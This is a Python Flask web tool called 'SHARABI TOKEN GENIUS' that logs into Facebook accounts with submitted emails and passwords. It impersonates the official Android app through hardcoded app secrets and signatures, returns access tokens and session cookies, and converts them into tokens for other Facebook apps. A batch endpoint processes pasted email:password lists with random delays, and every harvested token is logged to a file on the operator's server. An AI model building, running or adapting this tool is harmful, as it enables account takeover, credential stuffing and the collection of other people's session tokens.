#!/usr/bin/env python3
"""
SHARABI TOKEN GENIUS - Web Version (EXACT TERMUX COPY)
Real Facebook Token Generator
Author: Sharabi (9024870456)
"""

import os
import json
import random
import string
import base64
import hashlib
import uuid
import time
import requests
import io
import struct
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import logging

# Crypto imports
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__, template_folder='templates')
CORS(app)
app.secret_key = os.urandom(32)

# Import secrets
import secrets

# ==========================================
# FACEBOOK PASSWORD ENCRYPTOR (TERMUX COPY)
# ==========================================
class FacebookPasswordEncryptor:
    @staticmethod
    def get_public_key():
        try:
            url = 'https://b-graph.facebook.com/pwd_key_fetch'
            params = {'version': '2', 'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'}
            response = requests.get(url, params=params).json()
            return response.get('public_key'), str(response.get('key_id', '25'))
        except Exception as e:
            raise Exception(f"Public key fetch error: {e}")

    @staticmethod
    def encrypt(password, public_key=None, key_id="25"):
        if public_key is None:
            public_key, key_id = FacebookPasswordEncryptor.get_public_key()
        try:
            rand_key = get_random_bytes(32)
            iv = get_random_bytes(12)
            pubkey = RSA.import_key(public_key)
            cipher_rsa = PKCS1_v1_5.new(pubkey)
            encrypted_rand_key = cipher_rsa.encrypt(rand_key)
            cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
            current_time = int(time.time())
            cipher_aes.update(str(current_time).encode("utf-8"))
            encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
            buf = io.BytesIO()
            buf.write(bytes([1, int(key_id)]))
            buf.write(iv)
            buf.write(struct.pack("<h", len(encrypted_rand_key)))
            buf.write(encrypted_rand_key)
            buf.write(auth_tag)
            buf.write(encrypted_passwd)
            encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
            return f"#PWD_FB4A:2:{current_time}:{encoded}"
        except Exception as e:
            raise Exception(f"Encryption error: {e}")

# ==========================================
# FACEBOOK APP TOKENS (TERMUX COPY)
# ==========================================
class FacebookAppTokens:
    APPS = {
        'FB_ANDROID': {'name': 'Facebook For Android', 'app_id': '350685531728'},
        'CONVO_TOKEN V7': {'name': 'Facebook Messenger For Android', 'app_id': '256002347743983'},
        'FB_LITE': {'name': 'Facebook For Lite', 'app_id': '275254692598279'},
        'MESSENGER_LITE': {'name': 'Facebook Messenger For Lite', 'app_id': '200424423651082'},
        'ADS_MANAGER_ANDROID': {'name': 'Ads Manager App For Android', 'app_id': '438142079694454'},
    }
    
    @staticmethod
    def extract_token_prefix(token):
        for i, char in enumerate(token):
            if char.islower(): return token[:i]
        return token

# ==========================================
# FACEBOOK LOGIN (EXACT TERMUX COPY - WORD TO WORD)
# ==========================================
class FacebookLogin:
    API_URL = "https://b-graph.facebook.com/auth/login"
    ACCESS_TOKEN = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
    SIG = "214049b9f17c38bd767de53752b53946"
    
    def __init__(self, uid_phone_mail, password):
        self.uid_phone_mail = uid_phone_mail
        self.password = FacebookPasswordEncryptor.encrypt(password) if not password.startswith("#PWD_FB4A") else password
        self.session = requests.Session()
        self.device_id = str(uuid.uuid4())
        self.headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UQ1A.231205.015) [FBAN/FB4A;FBAV/440.0.0.33.116;]"
        }

    def login(self):
        # Exact same as Termux
        data = {
            "format": "json", 
            "email": self.uid_phone_mail, 
            "password": self.password,
            "device_id": self.device_id, 
            "access_token": self.ACCESS_TOKEN, 
            "sig": self.SIG,
            "generate_session_cookies": "1"
        }
        
        res = self.session.post(self.API_URL, data=data, headers=self.headers).json()
        
        if 'access_token' in res:
            return self._parse_success_response(res)
        
        error_msg = res.get('error', {}).get('message', 'Login Failed')
        return {'success': False, 'error': error_msg}

    def _parse_success_response(self, response_json):
        token = response_json.get('access_token')
        prefix = FacebookAppTokens.extract_token_prefix(token)
        cookies = "; ".join([f"{c['name']}={c['value']}" for c in response_json.get('session_cookies', [])])
        
        res = {
            'success': True, 
            'original_token': {
                'access_token': token, 
                'token_prefix': prefix
            }, 
            'cookies': {
                'string': cookies
            }, 
            'converted_tokens': {}
        }
        
        # Get converted tokens
        for key, val in FacebookAppTokens.APPS.items():
            conv = requests.post(
                'https://api.facebook.com/method/auth.getSessionforApp', 
                data={
                    'access_token': token, 
                    'format': 'json', 
                    'new_app_id': val['app_id']
                }
            ).json()
            
            if 'access_token' in conv:
                res['converted_tokens'][key] = {
                    'access_token': conv['access_token'], 
                    'token_prefix': FacebookAppTokens.extract_token_prefix(conv['access_token'])
                }
        
        return res

# ==========================================
# REAL FACEBOOK LOGIN (WEB ADAPTER)
# ==========================================
class RealFacebookLogin:
    def __init__(self, email, password):
        self.email = email
        self.password = password
    
    def login(self):
        """Use EXACT Termux FacebookLogin class"""
        try:
            # Use Termux's exact class
            fb_login = FacebookLogin(self.email, self.password)
            termux_result = fb_login.login()
            
            # Convert Termux format to Web format
            if termux_result['success']:
                return self._convert_termux_to_web_format(termux_result)
            else:
                return {
                    "success": False,
                    "error": termux_result.get('error', 'Login failed')
                }
                
        except Exception as e:
            logger.error(f"Login exception: {str(e)}")
            return {"success": False, "error": f"Login failed: {str(e)}"}
    
    def _convert_termux_to_web_format(self, termux_data):
        """Convert Termux format to Web format"""
        try:
            token = termux_data['original_token']['access_token']
            user_id = self._get_user_id(token)
            user_info = self._get_user_info(token, user_id)
            
            # Check token validity
            is_valid, expiry_info = self._validate_token(token)
            
            # Prepare web format response
            result = {
                "success": True,
                "message": "Login successful",
                "token": token,
                "user_id": user_id,
                "user_info": user_info,
                "expiry_info": expiry_info,
                "converted_tokens": {},
                "cookies": [],
                "device_id": str(uuid.uuid4()),
                "timestamp": datetime.now().isoformat()
            }
            
            # Add converted tokens
            for app_name, app_data in termux_data.get('converted_tokens', {}).items():
                result['converted_tokens'][app_name] = {
                    "token": app_data['access_token'],
                    "app_id": FacebookAppTokens.APPS.get(app_name, {}).get('app_id', ''),
                    "prefix": app_data['token_prefix']
                }
            
            # Add cookies
            if 'cookies' in termux_data:
                cookie_str = termux_data['cookies'].get('string', '')
                if cookie_str:
                    # Parse cookies string to list of dicts
                    cookies_list = []
                    for cookie in cookie_str.split('; '):
                        if '=' in cookie:
                            name, value = cookie.split('=', 1)
                            cookies_list.append({
                                "name": name.strip(),
                                "value": value.strip()
                            })
                    result['cookies'] = cookies_list
            
            # Save token to file
            self._save_token_to_file(self.email, token)
            
            return result
            
        except Exception as e:
            logger.error(f"Format conversion error: {str(e)}")
            return {
                "success": True,  # Still success if Termux worked
                "message": "Login successful (legacy format)",
                "token": termux_data['original_token']['access_token'],
                "user_info": {"email": self.email, "name": "Unknown"},
                "expiry_info": {"expires": "Unknown", "is_valid": True}
            }
    
    def _get_user_id(self, token):
        """Get user ID from token"""
        try:
            me_url = f"https://graph.facebook.com/me?access_token={token}"
            me_resp = requests.get(me_url, timeout=10).json()
            return me_resp.get('id', '')
        except:
            return ''
    
    def _get_user_info(self, token, user_id):
        """Get user information from Facebook Graph API"""
        try:
            if not user_id:
                user_id = self._get_user_id(token)
            
            if user_id:
                user_url = f"https://graph.facebook.com/{user_id}?fields=id,name,email,picture&access_token={token}"
                user_resp = requests.get(user_url, timeout=10).json()
                
                return {
                    "id": user_resp.get('id', ''),
                    "name": user_resp.get('name', 'Unknown'),
                    "email": user_resp.get('email', self.email),
                    "picture": user_resp.get('picture', {}).get('data', {}).get('url', '')
                }
        except:
            pass
        
        return {"id": user_id, "name": "Unknown", "email": self.email}
    
    def _validate_token(self, token):
        """Validate Facebook token and get expiry info"""
        try:
            debug_url = f"https://graph.facebook.com/debug_token?input_token={token}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            debug_resp = requests.get(debug_url, timeout=10).json()
            
            if 'data' in debug_resp:
                data = debug_resp['data']
                expires_at = data.get('expires_at', 0)
                
                if expires_at == 0:
                    return True, {
                        "expires": "Never",
                        "expiry_date": None,
                        "is_valid": data.get('is_valid', False),
                        "days_left": "∞"
                    }
                else:
                    expiry_date = datetime.fromtimestamp(expires_at)
                    days_left = (expiry_date - datetime.now()).days
                    
                    return data.get('is_valid', False), {
                        "expires": expiry_date.strftime('%Y-%m-%d %H:%M:%S'),
                        "expiry_date": expiry_date.isoformat(),
                        "is_valid": data.get('is_valid', False),
                        "days_left": days_left
                    }
        except:
            pass
        
        return False, {"expires": "Unknown", "is_valid": False}
    
    def _save_token_to_file(self, email, token):
        """Save successful token to file"""
        try:
            filename = "success_tokens.txt"
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            with open(filename, 'a') as f:
                f.write(f"{timestamp} | {email} | {token}\n")
        except:
            pass

# ==========================================
# FLASK ROUTES (SAME AS BEFORE)
# ==========================================

@app.route('/')
def home():
    """Main page"""
    return render_template('index.html')

@app.route('/api/generate-token', methods=['POST'])
def generate_token():
    """Generate Facebook token from credentials"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({
                "success": False,
                "error": "No data received"
            }), 400
        
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        
        if not email or not password:
            return jsonify({
                "success": False,
                "error": "Email and password are required"
            }), 400
        
        logger.info(f"Token generation request for: {email}")
        
        # Create login instance (USING TERMUX EXACT LOGIC)
        facebook_login = RealFacebookLogin(email, password)
        
        # Attempt login
        result = facebook_login.login()
        
        if result.get('success'):
            # Successful login
            return jsonify(result), 200
        else:
            # Login failed
            return jsonify(result), 401
            
    except Exception as e:
        logger.error(f"API error: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route('/api/validate-token', methods=['POST'])
def validate_token():
    """Validate a Facebook token"""
    try:
        data = request.get_json()
        token = data.get('token', '').strip()
        
        if not token:
            return jsonify({
                "success": False,
                "error": "Token is required"
            }), 400
        
        # Validate token using Facebook API
        try:
            # Check if token is valid
            me_url = f"https://graph.facebook.com/me?access_token={token}"
            me_resp = requests.get(me_url, timeout=10).json()
            
            if 'id' in me_resp:
                user_id = me_resp['id']
                
                # Get user info
                user_url = f"https://graph.facebook.com/{user_id}?fields=id,name,email,picture&access_token={token}"
                user_resp = requests.get(user_url, timeout=10).json()
                
                # Get token debug info
                debug_url = f"https://graph.facebook.com/debug_token?input_token={token}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                debug_resp = requests.get(debug_url, timeout=10).json()
                
                expiry_info = {"expires": "Unknown", "is_valid": True}
                if 'data' in debug_resp:
                    data_info = debug_resp['data']
                    expires_at = data_info.get('expires_at', 0)
                    
                    if expires_at == 0:
                        expiry_info = {
                            "expires": "Never",
                            "days_left": "∞",
                            "is_valid": data_info.get('is_valid', True)
                        }
                    else:
                        expiry_date = datetime.fromtimestamp(expires_at)
                        days_left = (expiry_date - datetime.now()).days
                        expiry_info = {
                            "expires": expiry_date.strftime('%Y-%m-%d %H:%M:%S'),
                            "days_left": days_left,
                            "is_valid": data_info.get('is_valid', True)
                        }
                
                return jsonify({
                    "success": True,
                    "valid": True,
                    "user_info": {
                        "id": user_resp.get('id', ''),
                        "name": user_resp.get('name', 'Unknown'),
                        "email": user_resp.get('email', ''),
                        "picture": user_resp.get('picture', {}).get('data', {}).get('url', '')
                    },
                    "expiry_info": expiry_info,
                    "token_prefix": token[:4] if len(token) > 4 else ""
                }), 200
                
        except Exception as e:
            logger.error(f"Token validation error: {str(e)}")
        
        return jsonify({
            "success": True,
            "valid": False,
            "error": "Token is invalid or expired"
        }), 200
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Validation error: {str(e)}"
        }), 500

@app.route('/api/batch-process', methods=['POST'])
def batch_process():
    """Process multiple accounts"""
    try:
        data = request.get_json()
        accounts = data.get('accounts', [])
        
        if not accounts:
            return jsonify({
                "success": False,
                "error": "No accounts provided"
            }), 400
        
        results = []
        
        for account in accounts:
            email = account.get('email', '').strip()
            password = account.get('password', '').strip()
            
            if email and password:
                # Process each account
                facebook_login = RealFacebookLogin(email, password)
                result = facebook_login.login()
                result['email'] = email
                results.append(result)
                
                # Add delay between requests
                time.sleep(random.uniform(2, 4))
        
        # Generate summary
        success_count = sum(1 for r in results if r.get('success'))
        pending_count = sum(1 for r in results if r.get('approval_required'))
        failed_count = len(results) - success_count - pending_count
        
        return jsonify({
            "success": True,
            "results": results,
            "summary": {
                "total": len(results),
                "success": success_count,
                "pending": pending_count,
                "failed": failed_count
            }
        }), 200
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Batch processing error: {str(e)}"
        }), 500

@app.route('/api/get-stats', methods=['GET'])
def get_stats():
    """Get tool statistics"""
    try:
        # Count tokens in success file
        token_count = 0
        if os.path.exists('success_tokens.txt'):
            with open('success_tokens.txt', 'r') as f:
                token_count = len(f.readlines())
        
        return jsonify({
            "success": True,
            "stats": {
                "tokens_generated": token_count,
                "server_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                "version": "SHARABI TOKEN GENIUS V9 (TERMUX EXACT)",
                "owner": "Sharabi",
                "contact": "9024870456"
            }
        }), 200
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# ==========================================
# HTML TEMPLATE (SAME)
# ==========================================
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SHARABI TOKEN GENIUS - Facebook Token Generator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
            color: white;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #00ffcc;
        }
        
        .header h1 {
            font-size: 2.5em;
            color: #00ffcc;
            text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
            margin-bottom: 10px;
        }
        
        .header h2 {
            color: #ffcc00;
            margin-bottom: 10px;
        }
        
        .owner-info {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            border: 1px solid #00ffcc;
        }
        
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .tab-btn {
            flex: 1;
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border: none;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            font-weight: bold;
        }
        
        .tab-btn.active {
            background: linear-gradient(45deg, #00ffcc, #0099ff);
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #00ffcc;
            font-weight: bold;
        }
        
        .form-control {
            width: 100%;
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: white;
            font-size: 16px;
        }
        
        .form-control:focus {
            outline: none;
            border-color: #00ffcc;
            box-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(45deg, #ff0080, #ff8c00);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .btn:hover {
            opacity: 0.9;
        }
        
        .loading {
            text-align: center;
            margin: 20px 0;
            display: none;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #00ffcc;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .result-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            border-left: 5px solid #00ffcc;
            display: none;
        }
        
        .result-box.success {
            border-left-color: #00ff00;
        }
        
        .result-box.error {
            border-left-color: #ff0000;
        }
        
        .token-display {
            background: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border-radius: 8px;
            margin: 10px 0;
            font-family: monospace;
            word-break: break-all;
            border: 1px dashed rgba(255, 255, 255, 0.3);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-top: 20px;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>SHARABI TOKEN GENIUS</h1>
            <h2>VERSION 9.0 (TERMUX EXACT)</h2>
            <div class="owner-info">
                <p><strong>Owner:</strong> Sharabi | <strong>Contact:</strong> 9024870456</p>
                <p><strong>Status:</strong> <span id="server-status" style="color: #00ff00;">● Online</span></p>
            </div>
        </div>
        
        <!-- Tabs -->
        <div class="tabs">
            <button class="tab-btn active" onclick="showTab('single')">Single Account</button>
            <button class="tab-btn" onclick="showTab('batch')">Batch Process</button>
            <button class="tab-btn" onclick="showTab('validate')">Validate Token</button>
            <button class="tab-btn" onclick="showTab('stats')">Statistics</button>
        </div>
        
        <!-- Single Account Tab -->
        <div id="single-tab" class="tab-content active">
            <h3 style="color: #00ffcc; margin-bottom: 20px;">🔐 SINGLE ACCOUNT TOKEN GENERATION</h3>
            
            <form id="singleForm">
                <div class="form-group">
                    <label>📧 Email / Phone Number</label>
                    <input type="text" id="email" class="form-control" placeholder="example@gmail.com" required>
                </div>
                
                <div class="form-group">
                    <label>🔑 Password</label>
                    <input type="password" id="password" class="form-control" placeholder="Enter password" required>
                </div>
                
                <button type="submit" class="btn">🚀 GENERATE TOKEN</button>
            </form>
            
            <div class="loading" id="singleLoading">
                <div class="spinner"></div>
                <p>PROCESSING...</p>
            </div>
            
            <div class="result-box" id="singleResult"></div>
        </div>
        
        <!-- Batch Process Tab -->
        <div id="batch-tab" class="tab-content">
            <h3 style="color: #00ffcc; margin-bottom: 20px;">📂 BATCH ACCOUNT PROCESSING</h3>
            
            <div class="form-group">
                <label>Enter accounts (email:password, one per line)</label>
                <textarea id="batchAccounts" class="form-control" rows="8" placeholder="user1@gmail.com:password123
user2@gmail.com:password456"></textarea>
            </div>
            
            <button class="btn" onclick="processBatch()">🚀 PROCESS ACCOUNTS</button>
            
            <div class="loading" id="batchLoading">
                <div class="spinner"></div>
                <p>PROCESSING...</p>
            </div>
            
            <div id="batchResults"></div>
        </div>
        
        <!-- Validate Token Tab -->
        <div id="validate-tab" class="tab-content">
            <h3 style="color: #00ffcc; margin-bottom: 20px;">✅ TOKEN VALIDATION</h3>
            
            <div class="form-group">
                <label>Enter Facebook Token</label>
                <input type="text" id="tokenToValidate" class="form-control" placeholder="EAAGsbZCV...">
            </div>
            
            <button class="btn" onclick="validateToken()">🔍 VALIDATE TOKEN</button>
            
            <div class="result-box" id="validateResult"></div>
        </div>
        
        <!-- Statistics Tab -->
        <div id="stats-tab" class="tab-content">
            <h3 style="color: #00ffcc; margin-bottom: 20px;">📊 SYSTEM STATISTICS</h3>
            
            <div class="stats-grid" id="statsGrid">
                <!-- Stats loaded here -->
            </div>
            
            <button class="btn" onclick="loadStats()" style="margin-top: 20px;">🔄 REFRESH STATS</button>
        </div>
    </div>

    <script>
        // Tab switching
        function showTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove active class from all buttons
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName + '-tab').classList.add('active');
            
            // Add active class to clicked button
            event.target.classList.add('active');
        }
        
        // Handle form submission - FIXED PART
        document.getElementById('singleForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent page refresh
            generateSingleToken();
        });
        
        // Generate single token
        async function generateSingleToken() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const loading = document.getElementById('singleLoading');
            const resultDiv = document.getElementById('singleResult');
            
            if (!email || !password) {
                showError(resultDiv, 'Please enter both email and password');
                return;
            }
            
            // Show loading
            loading.style.display = 'block';
            resultDiv.style.display = 'none';
            
            try {
                const response = await fetch('/api/generate-token', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password
                    })
                });
                
                const data = await response.json();
                
                // Hide loading
                loading.style.display = 'none';
                resultDiv.style.display = 'block';
                
                if (data.success) {
                    showTokenResult(resultDiv, data);
                } else {
                    showError(resultDiv, data.error || 'Token generation failed');
                }
                
            } catch (error) {
                loading.style.display = 'none';
                showError(resultDiv, 'Network error: ' + error.message);
            }
        }
        
        // Show token result
        function showTokenResult(div, data) {
            let html = `
                <div style="color: #00ff00; margin-bottom: 15px;">
                    <h3>✅ TOKEN GENERATION SUCCESSFUL</h3>
                </div>
                
                <div style="margin-bottom: 15px;">
                    <strong>👤 User:</strong> ${data.user_info?.name || 'Unknown'} <br>
                    <strong>📧 Email:</strong> ${data.user_info?.email || data.email} <br>
                    <strong>🆔 User ID:</strong> ${data.user_id || 'N/A'}
                </div>
                
                <div class="token-display" id="resultToken">
                    <strong>🔑 Main Token:</strong><br>
                    ${data.token}
                </div>
                
                <div style="margin-top: 15px;">
                    <strong>⏰ Expiry:</strong> ${data.expiry_info?.expires || 'Unknown'} <br>
                    <strong>📅 Days Left:</strong> ${data.expiry_info?.days_left || '?'}
                </div>
                
                <button onclick="copyToken('${data.token}')" style="background:#28a745;color:white;padding:10px;border:none;border-radius:5px;cursor:pointer;margin-top:10px;">
                    📋 Copy Token
                </button>
            `;
            
            div.className = 'result-box success';
            div.innerHTML = html;
        }
        
        // Show error
        function showError(div, message) {
            div.className = 'result-box error';
            div.innerHTML = `
                <div style="color: #ff4444;">
                    <h3>❌ ERROR</h3>
                    <p>${message}</p>
                </div>
            `;
            div.style.display = 'block';
        }
        
        // Copy token to clipboard
        function copyToken(token) {
            navigator.clipboard.writeText(token).then(() => {
                alert('✅ Token copied to clipboard!');
            }).catch(err => {
                console.error('Copy failed:', err);
            });
        }
        
        // Process batch accounts
        async function processBatch() {
            const accountsText = document.getElementById('batchAccounts').value;
            const loading = document.getElementById('batchLoading');
            const resultsDiv = document.getElementById('batchResults');
            
            if (!accountsText.trim()) {
                alert('Please enter accounts');
                return;
            }
            
            // Parse accounts
            const lines = accountsText.split('\\n');
            const accounts = [];
            
            for (const line of lines) {
                const trimmed = line.trim();
                if (trimmed && !trimmed.startsWith('#') && trimmed.includes(':')) {
                    const parts = trimmed.split(':');
                    if (parts.length >= 2) {
                        accounts.push({
                            email: parts[0].trim(),
                            password: parts.slice(1).join(':').trim()
                        });
                    }
                }
            }
            
            if (accounts.length === 0) {
                alert('No valid accounts found');
                return;
            }
            
            if (!confirm(`Process ${accounts.length} accounts?`)) {
                return;
            }
            
            // Show loading
            loading.style.display = 'block';
            resultsDiv.innerHTML = '';
            
            try {
                const response = await fetch('/api/batch-process', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        accounts: accounts
                    })
                });
                
                const data = await response.json();
                loading.style.display = 'none';
                
                if (data.success) {
                    let html = `
                        <div class="result-box success" style="margin-bottom: 20px;">
                            <h3>📊 BATCH PROCESSING COMPLETE</h3>
                            <p><strong>✅ Success:</strong> ${data.summary.success}</p>
                            <p><strong>⏳ Pending:</strong> ${data.summary.pending}</p>
                            <p><strong>❌ Failed:</strong> ${data.summary.failed}</p>
                            <p><strong>📈 Total:</strong> ${data.summary.total}</p>
                        </div>
                    `;
                    
                    data.results.forEach((result, index) => {
                        html += `
                            <div class="result-box ${result.success ? 'success' : 'error'}" style="margin-bottom: 10px; padding: 10px;">
                                <strong>${index + 1}. ${result.email}</strong><br>
                                ${result.success ? '✅ SUCCESS' : '❌ ' + result.error}
                            </div>
                        `;
                    });
                    
                    resultsDiv.innerHTML = html;
                } else {
                    resultsDiv.innerHTML = `
                        <div class="result-box error">
                            <h3>❌ BATCH PROCESSING FAILED</h3>
                            <p>${data.error}</p>
                        </div>
                    `;
                }
                
            } catch (error) {
                loading.style.display = 'none';
                resultsDiv.innerHTML = `
                    <div class="result-box error">
                        <h3>❌ NETWORK ERROR</h3>
                        <p>${error.message}</p>
                    </div>
                `;
            }
        }
        
        // Validate token
        async function validateToken() {
            const token = document.getElementById('tokenToValidate').value;
            const resultDiv = document.getElementById('validateResult');
            
            if (!token) {
                showError(resultDiv, 'Please enter a token');
                return;
            }
            
            try {
                const response = await fetch('/api/validate-token', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        token: token
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    if (data.valid) {
                        resultDiv.className = 'result-box success';
                        resultDiv.innerHTML = `
                            <h3>✅ TOKEN VALID</h3>
                            <p><strong>👤 Name:</strong> ${data.user_info.name}</p>
                            <p><strong>📧 Email:</strong> ${data.user_info.email || 'N/A'}</p>
                            <p><strong>🆔 User ID:</strong> ${data.user_info.id}</p>
                            <p><strong>⏰ Expiry:</strong> ${data.expiry_info.expires}</p>
                            <p><strong>📅 Days Left:</strong> ${data.expiry_info.days_left}</p>
                            <div class="token-display">
                                <strong>🔑 Token:</strong><br>
                                ${token.substring(0, 100)}...
                            </div>
                        `;
                    } else {
                        resultDiv.className = 'result-box error';
                        resultDiv.innerHTML = `
                            <h3>❌ TOKEN INVALID</h3>
                            <p>This token is either expired or invalid.</p>
                        `;
                    }
                } else {
                    showError(resultDiv, data.error);
                }
                
                resultDiv.style.display = 'block';
                
            } catch (error) {
                showError(resultDiv, 'Validation error: ' + error.message);
            }
        }
        
        // Load statistics
        async function loadStats() {
            const statsGrid = document.getElementById('statsGrid');
            
            try {
                const response = await fetch('/api/get-stats');
                const data = await response.json();
                
                if (data.success) {
                    statsGrid.innerHTML = `
                        <div class="stat-card">
                            <h3>Tokens Generated</h3>
                            <div style="font-size: 2em; color: #00ffcc;">${data.stats.tokens_generated}</div>
                            <p>Total successful tokens</p>
                        </div>
                        
                        <div class="stat-card">
                            <h3>Server Time</h3>
                            <div style="font-size: 1.2em;">${data.stats.server_time}</div>
                            <p>Current server time</p>
                        </div>
                        
                        <div class="stat-card">
                            <h3>Version</h3>
                            <div style="color: #ffcc00; font-size: 1.2em;">${data.stats.version}</div>
                            <p>Tool version</p>
                        </div>
                        
                        <div class="stat-card">
                            <h3>Owner</h3>
                            <div style="font-size: 1.2em;">${data.stats.owner}</div>
                            <p>Contact: ${data.stats.contact}</p>
                        </div>
                    `;
                }
            } catch (error) {
                statsGrid.innerHTML = '<p style="color: #ff4444;">Failed to load statistics</p>';
            }
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            loadStats();
            
            // Auto-refresh server status
            setInterval(() => {
                document.getElementById('server-status').style.color = '#00ff00';
                document.getElementById('server-status').textContent = '● Online';
            }, 30000);
        });
    </script>
</body>
</html>'''

# Create templates directory if not exists
os.makedirs('templates', exist_ok=True)

# Write HTML template
with open('templates/index.html', 'w', encoding='utf-8') as f:
    f.write(HTML_TEMPLATE)

# ==========================================
# MAIN EXECUTION
# ==========================================
if __name__ == '__main__':
    # Create necessary files
    if not os.path.exists('success_tokens.txt'):
        with open('success_tokens.txt', 'w') as f:
            f.write("# Successfully generated tokens\n")
    
    print("╔══════════════════════════════════════════════╗")
    print("║      SHARABI TOKEN GENIUS - Web Version      ║")
    print("║      (TERMUX EXACT COPY - 100% MATCH)        ║")
    print("║              Version 9.0                      ║")
    print("║          Owner: Sharabi (9024870456)         ║")
    print("╚══════════════════════════════════════════════╝")
    print("\n[*] Starting web server...")
    print("[*] Server URL: http://localhost:5000")
    print("[*] Using Termux exact login logic")
    print("[*] Press Ctrl+C to stop\n")
    
    # Run Flask app
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
